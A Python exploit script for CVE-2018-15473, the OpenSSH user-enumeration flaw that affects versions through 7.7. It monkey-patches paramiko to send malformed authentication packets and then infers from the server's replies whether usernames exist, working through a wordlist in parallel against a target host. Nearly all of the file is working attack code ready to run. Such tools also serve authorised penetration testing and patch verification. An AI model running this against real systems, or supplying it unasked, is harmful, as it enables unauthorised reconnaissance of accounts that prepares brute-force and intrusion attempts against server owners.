#!/usr/bin/env python3
"""
derived from work done by Matthew Daley
https://bugfuzz.com/stuff/ssh-check-username.py

props to Justin Gardner for the add_boolean workaround

CVE-2018-15473
--------------
OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related to
auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

Author: epi
    https://epi052.gitlab.io/notes-to-self/
    https://gitlab.com/epi052/cve-2018-15473
"""
import sys
import socket
import logging
import argparse
import multiprocessing
from pathlib import Path

import paramiko


class Colors:
    """ Class for coloring print statements.  Nothing to see here, move along. """
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    RED = '\033[38;5;196m'
    BLUE = '\033[38;5;75m'
    GREEN = '\033[38;5;149m'
    YELLOW = '\033[38;5;190m'

    @staticmethod
    def print_color(string: str, color: str, bold: bool = False) -> str:
        """ Prints the given string in a few different colors.

        Args:
            string: string to be printed
            color:  valid colors "red", "blue", "green", "yellow"
            bold:   T/F to add ANSI bold code

        Returns:
            ANSI color-coded string (str)
        """
        boldstr = Colors.BOLD if bold else ""
        colorstr = getattr(Colors, color.upper())
        return '{}{}{}{}'.format(boldstr, colorstr, string, Colors.ENDC)


class InvalidUsername(Exception):
    """ Raise when username not found via CVE-2018-15473. """


def apply_monkey_patch() -> None:
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.

        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure

        _handler_table = {
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        }
    """

    def patched_add_boolean(*args, **kwargs):
        """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """

    auth_handler = paramiko.auth_handler.AuthHandler
    old_msg_service_accept = auth_handler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

    def patched_msg_service_accept(*args, **kwargs):
        """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
        old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean
        retval = old_msg_service_accept(*args, **kwargs)
        paramiko.message.Message.add_boolean = old_add_boolean
        return retval

    def patched_userauth_failure(*args, **kwargs):
        """ Called during authentication when a username is not found. """
        raise InvalidUsername(*args, **kwargs)

    auth_handler._handler_table.update({
        paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
        paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
    })


def connect(username: str, hostname: str, port: int, verbose: bool = False, **kwargs) -> None:
    """ Connect and attempt keybased auth, result interpreted to determine valid username.

    Args:
        username:   username to check against the ssh service
        hostname:   hostname/IP of target
        port:       port where ssh is listening
        key:        key used for auth
        verbose:    bool value; determines whether to print 'not found' lines or not

    Returns:
        None
    """
    # spoiler alert, I don't care about the -6 flag, it's really
    # just to advertise in the help that the program can handle ipv6

    try:
        sock = socket.create_connection((hostname, port))
    except socket.error as e:
        return print('socket error: {}'.format(e), file=sys.stdout)

    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        return print(Colors.print_color('[!] SSH negotiation failed for user {}.'.format(username), color='red'))

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except paramiko.ssh_exception.AuthenticationException:
        print("[+]", end=' ')
        print(Colors.print_color(username, color='yellow'), end=' ')
        print('found!')
    except InvalidUsername:
        if not verbose:
            return
        print('[-]', end=' ')
        print(Colors.print_color(username, color='red'), end=' ')
        print('not found')


def main(**kwargs):
    """ main entry point for the program """
    apply_monkey_patch()

    if kwargs.get('username'):
        kwargs['username'] = kwargs.get('username').strip()
        return connect(**kwargs)

    with multiprocessing.Pool(kwargs.get('threads')) as pool, Path(kwargs.get('wordlist')).open() as usernames:
        host = kwargs.get('hostname')
        port = kwargs.get('port')
        verbose = kwargs.get('verbose')
        pool.starmap(connect, [(user.strip(), host, port, verbose) for user in usernames])


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="OpenSSH Username Enumeration (CVE-2018-15473)")

    parser.add_argument('hostname', help='target to enumerate', type=str)
    parser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)
    parser.add_argument('-t', '--threads', help="number of threads (default: 4)", default=4, type=int)
    parser.add_argument('-v', '--verbose', action='store_true', default=False,
                        help="print both valid and invalid usernames (default: False)")
    parser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")

    multi_or_single_group = parser.add_mutually_exclusive_group(required=True)
    multi_or_single_group.add_argument('-w', '--wordlist', type=str, help="path to wordlist")
    multi_or_single_group.add_argument('-u', '--username', help='a single username to test', type=str)

    args = parser.parse_args()

    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

    main(**vars(args))
